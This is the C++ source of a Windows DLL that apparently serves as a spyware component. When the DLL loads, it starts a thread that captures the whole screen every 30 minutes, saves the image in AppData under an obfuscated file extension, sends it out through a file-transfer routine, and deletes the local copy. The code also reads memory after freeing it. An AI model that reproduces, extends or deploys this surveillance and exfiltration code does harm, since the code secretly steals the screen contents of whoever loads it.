// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include "screenshot.h"
#include "obfuscate.h"
#include "sendfile.h"

int foo = 1;
std::string path;

extern "C" _declspec(dllexport)
DWORD WINAPI screenshot(LPVOID lpParam)
{
	int horizontal = 0;
	int vertical = 0;
	getDesktopResolution(horizontal, vertical);

	// take screenshot every 30 minutes
	while (1) {

		if (foo == 1)
		{
			wchar_t* localAppData = 0;
			SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &localAppData);
			CoTaskMemFree(static_cast<void*>(localAppData));
			while (*localAppData)
			{
				path += (char)*localAppData++;
			}
			foo--;
			path += "\\";
		}

		std::string fileNameStr = getCurrentDateTime();
		fileNameStr = path + fileNameStr + obf::decode("\x80\xfb\xc6\xf0");
		const char *fileName = fileNameStr.c_str();
		screenCapturePart(0, 0, horizontal, vertical, fileName);
		transferFile(fileNameStr);
		remove(fileNameStr.c_str());
		std::this_thread::sleep_for(std::chrono::minutes(30));
	}
	return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		CreateThread(NULL, NULL, screenshot, NULL, NULL, NULL);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
